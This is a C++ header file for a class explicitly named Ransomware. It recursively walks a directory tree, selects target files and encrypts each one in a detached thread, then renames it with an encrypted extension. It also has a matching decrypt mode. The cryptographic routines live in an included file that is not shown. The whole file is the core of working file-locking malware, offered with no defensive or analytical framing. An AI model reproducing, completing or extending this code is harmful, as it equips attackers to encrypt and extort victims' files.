#pragma once

#include "Crypt.h"
#include "FileEncryptionDecision.h"
#include <thread>

class Ransomware
{
private:
	const std::string m_startingDirectory;
public:
	static enum RansomwareOperation { Encrypt = 1, Decrypt };
	RansomwareOperation m_ransomwareOperation;
private:
	FileEncryptionDecisions m_fileEncryptionDecisions;
	Crypt crypt;

public:
	Ransomware(const std::string& startingDirectory, RansomwareOperation ransomwareOperation)
		: m_startingDirectory(startingDirectory), m_ransomwareOperation(ransomwareOperation) {}

	long Start()
	{
		int filesEncrypted = 0;
		for (const auto& entry : std::filesystem::recursive_directory_iterator(m_startingDirectory))
		{
			std::string filePath(entry.path().string());
			if (!IsTargetFile(filePath))
				continue;

			auto callable = [=]() { CryptFile(filePath); };
			std::thread worker(callable);
			if (worker.joinable())
				worker.detach();

			filesEncrypted++;
			std::cout << filePath << "  -  " << filesEncrypted << std::endl;
		}

		return filesEncrypted;
	}

private:
	bool IsTargetFile(const std::string& filePath)
	{
		std::error_code ec;
		if (std::filesystem::file_size(filePath, ec) <= 0)
			return false;

		if (m_ransomwareOperation == Encrypt)
		{
			if (!m_fileEncryptionDecisions.ShouldIEncrypt(filePath))
				return false;
		}
		else
		{
			if (!boost::ends_with(filePath, ENCRYPTED_FILE_EXTENTION))
				return false;
		}

		return true;
	}

	void CryptFile(const std::string filePath)
	{
		crypt.cryptFile(filePath);
		m_fileEncryptionDecisions.EncryptedFileExtension(filePath);
	}
};